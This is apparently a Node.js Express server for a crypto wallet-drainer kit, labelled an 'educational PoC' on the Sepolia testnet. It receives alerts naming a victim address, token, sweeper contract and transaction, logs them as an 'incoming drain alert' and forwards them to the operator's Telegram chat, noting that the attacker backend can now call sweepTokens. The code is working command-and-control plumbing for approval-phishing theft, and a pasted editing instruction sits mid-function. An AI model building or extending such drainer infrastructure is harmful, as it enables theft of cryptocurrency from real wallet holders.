require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');

const app = express();
app.use(cors());
app.use(express.json());

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/api/alert', (req, res) => {
    const { victimAddress, tokenAddress, sweeperAddress, txHash } = req.body;
    // Add this inside the app.post('/api/alert') function, right after defining `message`:
console.log("\n🚨 INCOMING DRAIN ALERT 🚨");
console.log(`Victim: ${victimAddress}`);

console.log(`Tx Hash: ${txHash}\n`);
    const message = `🚨 *EDUCATIONAL POC: APPROVAL DETECTED* 🚨\n\n` +
                    `👤 Victim: \`${victimAddress}\`\n` +
                    `🪙 Token: \`${tokenAddress}\`\n` +
                    `🕷️ Sweeper: \`${sweeperAddress}\`\n` +
                    `🔗 Tx: [View on Sepolia Etherscan](https://sepolia.etherscan.io/tx/${txHash})\n\n` +
                    `⚠️ Attacker backend can now call sweepTokens!`;

    bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' })
        .then(() => res.status(200).json({ success: true, message: "Alert sent" }))
        .catch(err => {
            console.error("Telegram error:", err);
            res.status(500).json({ success: false, error: err.message });
        });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🛡️ Educational PoC Backend running on port ${PORT}`);
});